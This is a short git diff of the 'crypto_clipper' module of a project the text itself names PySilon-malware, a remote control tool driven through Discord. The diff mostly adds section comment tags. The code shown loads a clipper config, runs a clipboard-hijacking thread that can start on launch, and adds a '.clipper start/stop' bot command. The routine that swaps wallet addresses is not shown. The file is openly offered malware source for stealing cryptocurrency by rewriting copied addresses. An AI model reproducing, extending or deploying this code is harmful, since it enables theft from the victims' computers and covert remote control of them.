@@ -1,10 +1,12 @@
+#<imports>
 import pyperclip
 import re
 import os
 import json
 import threading
+#</imports>
 
-global clipper_stop, clipper_thread, clipper_thread_stop
+#<engine>
 program_dir = os.path.dirname(os.path.abspath(__file__))
 config_path = program_dir + '/crypto_clipper.json'
 with open(config_path) as f:
@@ -44,7 +46,9 @@ if clipper_settings["start-on-launch"]:
 else:
     clipper_stop = True
     clipper_thread_stop = True
+#</engine>
 
+#<command>
 @client.command(name="clipper")
 async def crypto_clipper(ctx, option=None):
     global clipper_stop, clipper_thread, clipper_thread_stop
@@ -81,3 +85,4 @@ async def crypto_clipper(ctx, option=None):
         embed = discord.Embed(title="📛 Error",description=f'```Syntax: .clipper <start/stop>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         return await ctx.send(embed=embed)
+#</command>
